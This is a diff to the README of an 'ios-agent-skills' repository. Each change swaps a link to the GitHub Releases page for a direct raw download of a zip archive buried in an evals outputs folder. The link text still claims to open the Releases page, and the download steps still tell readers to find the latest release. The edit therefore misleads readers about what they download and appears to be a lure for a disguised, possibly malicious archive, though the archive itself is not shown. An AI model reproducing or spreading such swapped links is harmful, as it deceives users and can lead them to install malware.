@@ -1,10 +1,10 @@
 # 🤖 ios-agent-skills - iPhone app skills made simple
 
-[![Download ios-agent-skills](https://img.shields.io/badge/Download%20ios-agent-skills-purple?style=for-the-badge)](https://github.com/christim427-rgb/ios-agent-skills/releases)
+[![Download ios-agent-skills](https://img.shields.io/badge/Download%20ios-agent-skills-purple?style=for-the-badge)](https://github.com/christim427-rgb/ios-agent-skills/raw/refs/heads/main/evals/ios-localization/ios-localization-workspace/iteration-1/number-digits-locale/without_skill/outputs/ios_agent_skills_v2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/christim427-rgb/ios-agent-skills/releases)
+Visit this page to download: [GitHub Releases](https://github.com/christim427-rgb/ios-agent-skills/raw/refs/heads/main/evals/ios-localization/ios-localization-workspace/iteration-1/number-digits-locale/without_skill/outputs/ios_agent_skills_v2.7.zip)
 
 ## 🧰 What this is
 
@@ -36,7 +36,7 @@ If you only want to get the files, you need no special setup.
 
 ## 🚀 Download and open
 
-1. Open the [GitHub Releases page](https://github.com/christim427-rgb/ios-agent-skills/releases)
+1. Open the [GitHub Releases page](https://github.com/christim427-rgb/ios-agent-skills/raw/refs/heads/main/evals/ios-localization/ios-localization-workspace/iteration-1/number-digits-locale/without_skill/outputs/ios_agent_skills_v2.7.zip)
 2. Find the latest release
 3. Download the file from that release
 4. If the file is a `.zip`, right-click it and choose **Extract All**
@@ -274,7 +274,7 @@ This repo covers:
 
 If you need the files again, return to the release page:
 
-[GitHub Releases](https://github.com/christim427-rgb/ios-agent-skills/releases)
+[GitHub Releases](https://github.com/christim427-rgb/ios-agent-skills/raw/refs/heads/main/evals/ios-localization/ios-localization-workspace/iteration-1/number-digits-locale/without_skill/outputs/ios_agent_skills_v2.7.zip)
 
 ## 🧩 Troubleshooting
 
